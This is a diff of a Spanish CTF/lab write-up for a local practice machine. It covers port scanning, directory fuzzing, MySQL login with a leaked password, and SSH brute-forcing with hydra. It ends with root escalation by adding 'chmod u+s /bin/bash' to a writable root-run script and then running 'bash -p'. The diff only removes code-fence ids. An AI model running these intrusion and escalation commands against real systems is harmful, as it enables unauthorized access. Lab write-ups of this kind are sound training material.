@@ -41,7 +41,7 @@ Esto nos permite confirmar que la máquina está encendida y accesible dentro de
 
 Se realiza un escaneo completo sobre todos los puertos TCP para identificar los servicios expuestos en la máquina víctima:
 
-```bash id="kwh7dn"
+```bash 
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
 ```
 
@@ -59,7 +59,7 @@ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
 
 Después de identificar los puertos abiertos, procedemos a detectar versiones y configuraciones de los servicios activos:
 
-```bash id="ks7mbf"
+```bash 
 nmap -sCV -p22,80,3306 172.17.0.2
 ```
 
@@ -75,7 +75,7 @@ Este análisis permite obtener información más detallada sobre los servicios e
 
 Accedemos al servicio web desde el navegador:
 
-```bash id="7d6up2"
+```bash 
 http://172.17.0.2
 ```
 
@@ -93,7 +93,7 @@ Al revisar el código fuente de la página utilizando `CTRL + U`, encontramos un
 
 Para identificar rutas ocultas o directorios interesantes, realizamos fuzzing utilizando `gobuster`:
 
-```bash id="p5pfb5"
+```bash 
 gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .env,.php,.bak,.old,.zip,.txt -b 403,404 --exclude-length 8068
 ```
 
@@ -103,7 +103,7 @@ Como resultado, se detectan múltiples directorios dentro de la aplicación.
 
 Entre todos los resultados encontrados, el directorio más interesante es:
 
-```bash id="ikvtq4"
+```bash 
 /secret/
 ```
 
@@ -117,7 +117,7 @@ Este directorio resulta especialmente relevante porque podría permitir acceder 
 
 Continuando con el proceso de reconocimiento, realizamos fuzzing específicamente sobre el directorio `/imagenes`:
 
-```bash id="8m0c8p"
+```bash 
 gobuster dir -u http://172.17.0.2/imagenes -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .env,.php,.bak,.old,.zip,.txt -b 403,404 --exclude-length 8068
 ```
 
@@ -131,7 +131,7 @@ Durante esta enumeración se encuentra un archivo `README` que contiene una cont
 
 Al revisar el primer archivo descargado desde el directorio `/secret`, encontramos una pista importante:
 
-```bash id="y2v3tt"
+```bash 
 mysql -u rocket -p -h 172.17.0.2 --ssl=0
 ```
 
@@ -139,7 +139,7 @@ mysql -u rocket -p -h 172.17.0.2 --ssl=0
 
 El sistema solicita una contraseña, por lo que utilizamos la credencial encontrada previamente:
 
-```bash id="e0n5yf"
+```bash 
 password1
 ```
 
@@ -161,29 +161,29 @@ Una vez dentro de MySQL, comenzamos el proceso de enumeración buscando informac
 
 Comandos utilizados:
 
-```sql id="3h9axj"
+```sql
 SHOW DATABASES;
 ```
 
-```sql id="nq9dnb"
+```sql 
 USE files_secret;
 ```
 
-```sql id="4i5rv0"
+```sql 
 SHOW TABLES;
 ```
 
-```sql id="7chh1q"
+```sql 
 DESCRIBE rutas;
 ```
 
-```sql id="wzy5ev"
+```sql 
 SELECT * FROM rutas;
 ```
 
 Durante esta fase descubrimos una ruta interesante almacenada dentro de la base de datos:
 
-```bash id="vv54hb"
+```bash 
 /unprivate/secret
 ```
 
@@ -208,7 +208,7 @@ Después de enviar los datos, el servidor descarga automáticamente un archivo `
 
 Analizando las peticiones con Burp Suite se identificó el siguiente comportamiento:
 
-```http id="x9v5hy"
+```http 
 POST /unprivate/secret/generate.php HTTP/1.1
 ```
 
@@ -251,7 +251,7 @@ Al intentar descomprimirlo utilizando `unzip`, el sistema solicita una contrase�
 
 Probamos utilizando la contraseña encontrada anteriormente:
 
-```bash id="k7nj9e"
+```bash 
 password1
 ```
 
@@ -278,7 +278,7 @@ A continuación, se crea:
 
 Con las listas preparadas, utilizamos `hydra` para realizar un ataque de fuerza bruta contra el servicio SSH:
 
-```bash id="dj8r74"
+```bash 
 hydra -L user.txt -P password16.txt ssh://172.17.0.2
 ```
 
@@ -286,13 +286,13 @@ Finalmente se descubren las credenciales válidas:
 
 ### 👤 Usuario
 
-```bash id="mrqz6r"
+```bash 
 grooti
 ```
 
 ### 🔑 Contraseña
 
-```bash id="nq1h9u"
+```bash 
 YoSoYgRo0t
 ```
 
@@ -350,13 +350,13 @@ Gracias a este análisis se identificó un archivo sospechoso dentro del directo
 
 Al revisar manualmente el contenido de `/tmp`, encontramos un script llamado:
 
-```bash id="9krw67"
+```bash 
 malicious.sh
 ```
 
 El archivo pertenecía al usuario `root`, pero tenía permisos de escritura inseguros:
 
-```bash id="6vn9jv"
+```bash 
 -rwxrw-r-- 1 root grooti 221 Jul 22 2025 malicious.sh
 ```
 
@@ -368,7 +368,7 @@ Esto significa que el usuario `grooti` tenía permisos para modificar el script,
 
 Al analizar el contenido del archivo observamos lo siguiente:
 
-```bash id="7u24pd"
+```bash 
 #!/bin/bash
 
 LOG_TEMP="/tmp/mi_log_temporal.log"
@@ -398,7 +398,7 @@ Debido a que el archivo tenía permisos de escritura inseguros, fue posible modi
 
 Se comentaron las líneas originales y se añadió el siguiente comando:
 
-```bash id="4j9pqz"
+```bash 
 chmod u+s /bin/bash
 ```
 
@@ -408,7 +408,7 @@ Cuando un binario tiene el bit `SUID` habilitado y pertenece a `root`, cualquier
 
 El contenido final del script quedó similar a:
 
-```bash id="4shn2e"
+```bash 
 #!/bin/bash
 
 #LOG_TEMP="/tmp/mi_log_temporal.log"
@@ -430,7 +430,7 @@ chmod u+s /bin/bash
 
 Después de esperar a que el sistema ejecutara nuevamente el script automatizado, se utilizó el siguiente comando:
 
-```bash id="sfp79e"
+```bash 
 bash -p
 ```
 
@@ -438,13 +438,13 @@ La opción `-p` permite conservar los privilegios efectivos del binario `bash` c
 
 Finalmente, verificamos los privilegios obtenidos:
 
-```bash id="a4frq7"
+```bash 
 whoami
 ```
 
 Resultado:
 
-```bash id="sq4xnp"
+```bash 
 root
 ```
 
